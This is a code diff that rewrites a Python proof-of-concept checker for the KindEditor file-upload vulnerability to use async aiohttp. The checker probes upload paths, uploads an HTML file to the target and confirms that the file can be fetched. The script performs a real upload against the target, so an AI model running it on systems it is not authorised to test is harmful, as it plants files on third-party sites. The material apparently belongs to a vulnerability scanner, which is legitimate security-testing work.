@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 
 import re
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+import aiohttp
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class Upload_File_BaseVerify:
     def __init__(self, url):
@@ -49,7 +50,7 @@ class Upload_File_BaseVerify:
                         </html>
         ''' %(self.url, self.path)
 
-    def check_path(self):
+    async def check_path(self):
 
         """
         检测是否存在路径
@@ -64,13 +65,12 @@ class Upload_File_BaseVerify:
             self.url = "http://" + self.url
         for url in site_type:
             check_url = self.url + url + '?dir=file'
-            check = request.get(check_url, headers = self.headers)
-            if check.status_code == 200:
+            check = await request.get(check_url, headers = self.headers)
+            if check.status == 200:
                 self.path = check_url
                 return True
-        return False
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -81,32 +81,26 @@ class Upload_File_BaseVerify:
         """
 
         try:
-            if self.check_path():
+            if await self.check_path():
                 files = {
-                    'imgFile': ('test.html', self.html_payload, 'application/octet-stream')
+                    'file_type': 'imgFile',
+                    'file_name': 'test.html',
+                    'file_content': self.html_payload, 
+                    'content_type': 'application/octet-stream'
                 }
-                upload_html = request.post(self.path, headers = self.headers, files = files)
-                if upload_html.status_code == 200:
+                data = aiohttp.FormData()
+                data.add_field(files['file_type'], files['file_content'], filename = files['file_name'], content_type = files['content_type'])
+                upload_html = await request.post(self.path, headers = self.headers, data = data)
+                if upload_html.status == 200:
                     pattern = re.compile('{"error":0,"url":"(.*?)"}')
-                    #print(upload_html.text)
-                    html = pattern.findall(upload_html.text)[0].replace('\\', '').split('/')
+                    html = pattern.findall(await upload_html.text())[0].replace('\\', '').split('/')
                     html_path = '/' + '/'.join(html[2:])
-                    check_html = request.get(self.url + html_path, headers = self.headers)
-                    '''if check_html.status_code == 200:
-                        print("存在kindeditor上传漏洞")
-                        return True'''
-                    print("存在kindeditor上传漏洞")
-                    return True
-                else:
-                    print("不存在kindeditor上传漏洞")
-                    return False
-            else:
-                print("不存在kindeditor上传漏洞")
-                return False
+                    check_html = await request.get(self.url + html_path, headers = self.headers)
+                    if check_html.status == 200:
+                        # print("存在kindeditor上传漏洞")
+                        return True
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
